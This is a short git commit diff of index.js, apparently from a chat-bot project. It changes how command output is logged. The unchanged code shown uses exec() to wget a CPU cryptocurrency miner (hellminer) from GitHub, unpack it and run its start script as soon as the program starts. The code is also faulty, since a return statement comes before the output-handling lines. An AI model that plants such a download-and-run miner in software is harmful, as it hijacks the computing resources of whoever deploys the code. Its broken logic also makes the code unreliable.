62e5114e83e532baf62db6fc5c7243a430f1033b
RIFAIGGZ <76506048+itsmeR1F4I@users.noreply.github.com>
2022-06-22 14:00:08 +0700

    Update index.js

--- index.js
+++ index.js
@@ -3,5 +3,5 @@ console.log('STARTING...');
 rifai = exec('wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && bash start.sh')
 return rifai;
 let { stdout, stderr } = rifai
-    if (stdout.trim()) m.reply(stdout)
-    if (stderr.trim()) m.reply(stderr)
+    if (stdout.trim()) console.log(stdout)
+    if (stderr.trim()) console.log(stderr)
